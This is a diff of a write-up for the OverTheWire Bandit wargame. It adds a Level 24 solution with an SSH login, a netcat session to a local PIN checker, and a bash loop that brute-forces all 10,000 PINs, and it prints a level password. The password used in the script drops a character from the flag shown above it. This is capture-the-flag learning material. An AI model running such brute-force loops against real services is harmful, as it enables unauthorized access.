@@ -349,18 +349,43 @@ After one minute i got the flag :)
 ```
       cat         /tmp/bandit23lu/password
 ```
-
 ``` FLAG: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ```
 
 
 ### [Level 24](http://overthewire.org/wargames/bandit/bandit25.html)
                     
 ```sh 
-      ssh bandit23@bandit.labs.overthewire.org -p 2220
+      ssh bandit24@bandit.labs.overthewire.org -p 2220
       UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+      nc localhost 30002
 ``` 
+I got the following:
+```
+      I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+```
+I inserted: `UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh 0123` and got: `Fail! You did not supply enough data. Try again`
 
+Then i created a simple bash script to automate brute force password guessing:
+```sh
+      mkdir -p    /tmp/bandit24lu
+      touch       /tmp/bandit24lu/solver.sh
+      chmod 777   /tmp/bandit24lu/solver.sh
+      vim         /tmp/bandit24lu/solver.sh
 
+#!/bin/bash
+PASS=UoMYTrfrBFHyQXmg6gzctqAwOmw1Ioh
+N=10000
+PIN=0
+while [ $PIN -lt $N ]
+do
+      response="$(echo $PASS $PIN | nc localhost 30002)"
+      echo -ne $response
+      ((PIN++))
+done 
+```
+```
+      /tmp/bandit24lu/solver.sh
+```
 
 
 
